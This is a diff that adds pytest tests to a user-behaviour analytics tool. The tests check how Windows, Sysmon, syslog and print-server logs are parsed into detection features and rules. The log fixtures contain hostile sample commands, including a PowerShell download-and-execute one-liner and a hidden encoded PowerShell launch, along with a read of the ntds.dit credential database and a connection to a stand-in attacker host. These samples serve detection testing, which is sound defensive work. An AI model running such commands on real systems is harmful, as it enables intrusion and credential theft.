@@ -427,3 +427,146 @@ def test_subdomains_time_on_site_and_beaconing():
     # a person reading pages at irregular times is not a beacon
     human = net[net["site"] == "ibm.com"]
     assert web.tunnelling_and_beacons(human)["beaconing"].sum() == 0
+
+
+def test_usb_privilege_share_print_and_powershell_events_are_parsed():
+    from ueba import sources
+    logon = ("An account was successfully logged on.\n\nSubject:\n\tAccount Name:\t\tPC-014$\n\nLogon Information:\n"
+             "\tLogon Type:\t\t2\n\nNew Logon:\n\tAccount Name:\t\talice\n\nNetwork Information:\n"
+             "\tWorkstation Name:\tPC-014\n\tSource Network Address:\t-\n\nComputer:\tPC-014\n")
+    usb = ("A new external device was recognized by the system.\n\nSubject:\n\tAccount Name:\t\tPC-014$\n\n"
+           "Device ID:\tUSBSTOR\\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\\4C530001&0\n\nDevice Name:\tSanDisk Ultra\n\n"
+           "Class Name:\tDiskDrive\n\nComputer:\tPC-014\n")
+    priv = "Special privileges assigned to new logon.\n\nSubject:\n\tAccount Name:\t\talice\n\nPrivileges:\t\tSeDebugPrivilege\n\t\t\tSeBackupPrivilege\n"
+    runas = ("A logon was attempted using explicit credentials.\n\nSubject:\n\tAccount Name:\t\talice\n\n"
+             "Account Whose Credentials Were Used:\n\tAccount Name:\t\tadministrator\n\nTarget Server:\n"
+             "\tTarget Server Name:\tFS01\n\nProcess Information:\n\tProcess Name:\t\tC:\\Windows\\System32\\runas.exe\n")
+    share = ("A network share object was checked.\n\nSubject:\n\tAccount Name:\t\talice\n\nNetwork Information:\n"
+             "\tSource Address:\t\t10.1.4.23\n\nShare Information:\n\tShare Name:\t\t\\\\*\\{name}\n"
+             "\tRelative Target Name:\t{rel}\n\nAccess Request Information:\n\tAccesses:\t\t{acc}\n")
+    printed = ("Document 5, Budget.xlsx owned by alice on \\\\PC-014 was printed on HP-Finance-2 through port "
+               "IP_10.1.9.20.  Size in bytes: 482113. Pages printed: 12. No user action is required.")
+    block = "Creating Scriptblock text (1 of 1):\nIEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\n\nScriptBlock ID: 1f\nPath: \nComputer:\tPC-014\n"
+    module = ("CommandInvocation(Get-ChildItem): \"Get-ChildItem\"\nParameterBinding(Get-ChildItem): name=\"Path\"; "
+              "value=\"C:\\Deploy\"\n\nContext:\n        Host Application = powershell.exe\n"
+              "        Command Name = Get-ChildItem\n        User = CORP\\bob\n")
+    proc = ("A new process has been created.\n\nCreator Subject:\n\tAccount Name:\t\talice\n\nProcess Information:\n"
+            "\tNew Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
+            "\tProcess Command Line:\tpowershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA\n")
+    events = [(4624, "9:00:00", logon), (6416, "9:05:00", usb), (4672, "9:06:00", priv), (4648, "9:07:00", runas),
+              (5145, "9:08:00", share.format(name="Finance", rel="Budget\\2026.xlsx", acc="WriteData (or AddFile)")),
+              (5145, "9:09:00", share.format(name="C$", rel="Windows\\NTDS\\ntds.dit", acc="ReadData (or ListDirectory)")),
+              (5145, "9:09:30", share.format(name="IPC$", rel="srvsvc", acc="ReadData")),
+              (307, "9:10:00", printed), (4104, "9:11:00", block), (4103, "9:12:00", module), (4688, "9:13:00", proc)]
+    csv_text = "Keywords,Date and Time,Source,Event ID,Task Category\n" + "".join(
+        f'Info,6/20/2026 {t} AM,src,{eid},cat,"{msg.replace(chr(34), chr(34) * 2)}"\n' for eid, t, msg in events)
+    acc = dict(sources.read_bytes("Security.csv", csv_text.encode()))["Security.csv - access"]
+    by = {a: g for a, g in acc.groupby("action")}
+    assert set(by) == {"usb_connect", "admin_logon", "runas", "write", "read", "print", "powershell"}
+    # the USB stick and the script block were logged by the machine: both go to alice, who was logged on to PC-014
+    assert by["usb_connect"].iloc[0][["user", "resource"]].tolist() == ["alice", "USB storage: SanDisk Ultra [4C530001]"]
+    assert by["runas"].iloc[0]["resource"] == "run as administrator on FS01"
+    assert by["write"].iloc[0]["resource"].endswith("\\Finance\\Budget\\2026.xlsx")
+    assert by["read"].iloc[0]["resource"].endswith("\\C$\\Windows\\NTDS\\ntds.dit") and len(by["read"]) == 1   # IPC$ dropped
+    assert by["print"].iloc[0][["user", "device", "resource", "pages", "printer"]].tolist() == \
+        ["alice", "PC-014", "Budget.xlsx", 12, "HP-Finance-2"]
+    ps = by["powershell"].sort_values("timestamp")
+    assert ps["user"].tolist() == ["alice", "CORP\\bob", "alice"] and "DownloadString" in ps.iloc[0]["resource"]
+    assert ps.iloc[1]["resource"] == "Get-ChildItem -Path C:\\Deploy" and "-enc" in ps.iloc[2]["resource"]
+    # the action names survive the generic value normalisation
+    conv = sources.convert("access", acc, sources.guess_mapping("access", list(acc.columns), acc))
+    assert conv.ok and set(conv.df["action"]) == set(by) and conv.df["pages"].sum() == 12
+
+    # Linux: the kernel reports the stick, the last ssh login on that host owns it
+    text = ("Mar  3 09:12:01 ws7 sshd[811]: Accepted publickey for carol from 10.0.0.5 port 50000 ssh2\n"
+            "Mar  3 09:20:00 ws7 kernel: [ 100.1] usb 2-1: Product: DataTraveler\n"
+            "Mar  3 09:20:00 ws7 kernel: [ 100.1] usb 2-1: Manufacturer: Kingston\n"
+            "Mar  3 09:20:00 ws7 kernel: [ 100.1] usb 2-1: SerialNumber: E0D5\n"
+            "Mar  3 09:20:01 ws7 kernel: [ 100.2] usb-storage 2-1:1.0: USB Mass Storage device detected\n").encode()
+    x = dict(sources.read_bytes("syslog", text))["syslog - access"]
+    assert x.iloc[0][["user", "action", "resource"]].tolist() == ["carol", "usb_connect",
+                                                                  "USB storage: Kingston DataTraveler [E0D5]"]
+
+    # a print server's job list (PaperCut-style CSV) has no action column: every row is a print job
+    jobs = pd.DataFrame({"Time": ["2026-06-20 10:00:00"], "User": ["CORP\\Dev"], "Pages": [40], "Printer": ["HP-2"],
+                         "Document Name": ["plan.docx"], "Client": ["PC-9"]})
+    assert sources.guess_stream(list(jobs.columns), "papercut_print_log.csv", jobs) == "access"
+    conv = sources.convert("access", jobs, sources.guess_mapping("access", list(jobs.columns), jobs))
+    assert conv.ok and conv.df.iloc[0][["user", "action", "resource", "pages", "printer"]].tolist() == \
+        ["dev", "print", "plan.docx", 40, "HP-2"]
+
+
+def test_machine_logged_events_fall_back_to_the_device_owner():
+    from ueba import ingest
+    acc = ingest.normalise("access", pd.DataFrame({
+        "timestamp": ["2026-06-20 09:00:00"] * 3, "user": ["?PC-1", "?PC-2", "?PC-3"], "device": ["PC-1", "PC-2", "PC-3"],
+        "resource": ["USB storage: x"] * 3, "action": ["usb_connect"] * 3, "sensitivity": "internal", "status": "success"}))
+    auth = ingest.normalise("auth", pd.DataFrame({"timestamp": ["2026-06-19 09:00:00"], "user": ["raj"],
+                                                  "src_device": ["PC-2"], "dest_host": ["PC-2"], "result": ["success"]}))
+    frames = {"access": acc, "auth": auth, "devices": pd.DataFrame({"device": ["PC-1"], "owner": ["Ana"]})}
+    ingest.resolve_device_users(frames)
+    assert frames["access"]["user"].tolist() == ["ana", "raj"]            # inventory owner, usual user, PC-3 dropped
+
+
+def test_activity_signals_and_rules(small_raw, tmp_path):
+    from ueba.detectors import apply_rules
+    from ueba.features import ACTIVITY_SIGNALS, USER_FEATURES, user_features
+    from ueba.ingest import load_logs
+    frames = load_logs(small_raw)
+    feats = user_features(frames)
+    assert set(ACTIVITY_SIGNALS) <= set(feats.columns) and not set(ACTIVITY_SIGNALS) & set(USER_FEATURES)
+    assert feats["pages_printed"].sum() > 0 and feats["ps_commands"].sum() > 0 and feats["admin_logons"].sum() > 0
+    # print jobs, PowerShell and admin logons are not counted as file accesses
+    acc = frames["access"]
+    n_files = (~acc["action"].isin(["print", "powershell", "admin_logon", "runas"])).sum()
+    assert feats["access_events"].sum() == n_files
+    truth = frames["ground_truth"]
+    day = lambda scen: truth[(truth.scenario == scen) & (truth.entity_type == "user")].iloc[0]    # noqa: E731
+    row = lambda t: feats[(feats.entity == t.entity) & (feats.date == t.date)].iloc[0]             # noqa: E731
+    pe, lat, ab = row(day("privilege_escalation")), row(day("lateral_movement")), row(day("admin_account_abuse"))
+    assert pe.admin_logons == 1 and pe.runas_events == 1 and pe.ps_suspicious == 2 and pe.admin_share_access == 1
+    assert lat.admin_share_access == 12 and lat.new_shares >= 12 and lat.ps_suspicious == 0
+    assert ab.ps_suspicious == 2
+    ins = feats[(feats.entity == day("insider_slow_exfiltration").entity)
+                & feats.date.isin(truth.loc[truth.scenario == "insider_slow_exfiltration", "date"])]
+    assert (ins.usb_devices == 1).all() and ins.new_usb_devices.sum() == 1 and ins.pages_printed.is_monotonic_increasing
+
+    base = {c: 0 for c in list(feats.columns) + ["baseline_restricted"] if c not in ("entity", "date", "department")}
+    quiet = dict(base, is_admin=False, department="x")
+    df = pd.DataFrame([
+        dict(quiet, admin_logons=2, baseline_privileged=0),                      # R24: never had admin rights
+        dict(quiet, admin_logons=2, baseline_privileged=90),                     # routine
+        dict(quiet, admin_logons=2, baseline_privileged=0, is_admin=True),       # a listed administrator
+        dict(quiet, admin_share_access=3, baseline_admin_share=0, new_shares=4),  # R25 + R26
+        dict(quiet, pages_printed=180, print_jobs=4, baseline_pages=8),          # R27
+        dict(quiet, pages_printed=180, print_jobs=4, baseline_pages=150),        # a heavy printer every day
+        dict(quiet, ps_suspicious=1, ps_commands=5)])                            # R28
+    _, hits = apply_rules(df, "user")
+    assert [[h["rule_id"] for h in x] for x in hits] == [["R24"], [], [], ["R25", "R26"], ["R27"], [], ["R28"]]
+
+
+def test_sysmon_events_from_event_viewer_csv():
+    """Sysmon process starts, network connections, files and DNS queries; same ids in other logs are not Sysmon."""
+    from ueba import sources
+    from ueba.features import PS_SUSPICIOUS
+    sm = "Microsoft-Windows-Sysmon"
+    ps = ("Process Create:\nUtcTime: 2026-06-20 10:00:00.000\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
+          "powershell.exe\nCommandLine: powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x')"
+          "\nUser: CORP\\bob\nParentImage: C:\\Windows\\explorer.exe")
+    net = ("Network connection detected:\nImage: C:\\Windows\\System32\\rundll32.exe\nUser: CORP\\bob\nProtocol: tcp\n"
+           "SourceIp: 10.0.0.5\nDestinationIp: 45.76.12.27\nDestinationHostname: evil.example.com\nDestinationPort: 443")
+    dns = "Dns query:\nQueryName: a1b2c3.tunnel.example.net\nUser: CORP\\bob"
+    fil = "File created:\nTargetFilename: C:\\Users\\bob\\AppData\\Local\\Temp\\payload.dll\nUser: CORP\\bob"
+    sysacct = "Process Create:\nImage: C:\\Windows\\System32\\svchost.exe\nCommandLine: svchost\nUser: NT AUTHORITY\\SYSTEM"
+    rows = [(sm, 1, ps), (sm, 3, net), (sm, 22, dns), (sm, 11, fil), (sm, 1, sysacct),
+            ("Microsoft-Windows-Kernel-General", 1, "The system time has changed.")]     # EID 1 that isn't Sysmon
+    csv_text = "Keywords,Date and Time,Source,Event ID,Task Category\n" + "".join(
+        f'Information,6/20/2026 10:0{i}:00 AM,{src},{eid},None,"{msg}"\n' for i, (src, eid, msg) in enumerate(rows))
+    out = dict(sources.read_bytes("Sysmon.csv", csv_text.encode()))
+    acc, net_df = out["Sysmon.csv - access"], out["Sysmon.csv - network"]
+    assert len(acc) == 2 and set(acc["user"]) == {"bob"}                     # SYSTEM and the kernel event dropped
+    cmd = acc[acc["action"] == "powershell"].iloc[0]["resource"]
+    assert "DownloadString" in cmd and pd.Series([cmd]).str.contains(PS_SUSPICIOUS, case=False, regex=True)[0]
+    assert acc[acc["action"] == "write"].iloc[0]["resource"].endswith("payload.dll")
+    assert set(net_df["domain"]) == {"evil.example.com", "a1b2c3.tunnel.example.net"}
+    assert net_df.set_index("domain").loc["evil.example.com", "dst_port"] == 443
